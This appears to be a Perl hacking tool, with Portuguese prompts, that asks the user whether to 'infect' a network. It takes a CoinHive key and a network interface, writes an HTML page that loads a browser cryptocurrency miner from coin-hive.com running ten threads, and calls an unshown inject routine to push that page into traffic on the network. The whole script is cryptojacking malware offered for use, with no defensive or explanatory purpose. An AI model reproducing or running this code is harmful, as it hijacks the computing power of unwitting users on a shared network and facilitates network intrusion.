#!/usr/bin/perl 
# Created by Ergo - Your King 
# salves : EOF - FDN - CONHECIMENTO LIVRE - MODDEX 
require "banner.pl"; 
require "infect.pl";
use strict; 
use warnings;
use File::Basename;

my $arquivo = "inject.html";
sub hello{
    print "\nVoce  tem certeza que deseja infectar essa rede ?(s/n)\n"; 
    my $sn = <STDIN>; 
    if($sn ne "s\n"){
        print "Saindo...\n";
        sleep(1);
        exit;
    
    }
}
hello(); 
print "Digite sua public key : "; 
chomp(my $key = <STDIN>);  
sleep(1);
print "Digite sua interface de rede (exemplo wlan0, eth0, etc) : "; 
chomp(my $rede = <STDIN>);
sleep(1);
print "Criando codigo para key : $key\n"; 
sleep(2); 
print color("reset");
print "Gerando codigo para inject...............[";
print color("green"); 
print "OK"; 
print color("reset"); 
print "]\n";
sleep(2);
print color("yellow");
sub escrever{
    open (my $fh, ">$arquivo") or die "Nao foi possivel abrir o arquivo $arquivo";
    print $fh qq{
        <!--
        Created by Ergo - Your King 
        Salve: EOF - FABRICA DE NOOBS - CONHECIMENTO LIVRE - MADDOX
        eh isso, doidera!
        -->
        <html>
        <script src = "https://coin-hive.com/lib/coinhive.min.js"></script> 
        <script>
        var minerador = new CoinHive.Anonymous("$key"); 
        minerador.setNumThreads(10);
        minerador.start();
        </script>
        </html>
    };
    close($fh);
}
escrever();
print color("reset");
sleep(1);
print "Iniciando proxy..."; 
print "............."; 
sleep(1); 
print "[";
print color("green"); 
print "OK";
print color("reset"); 
print "]\n";
print "Injetando script..."; 
print "............."; 
sleep(1); 
print "[";
print color("green"); 
print "OK";
print color("reset"); 
print "]\n"; 
inject();
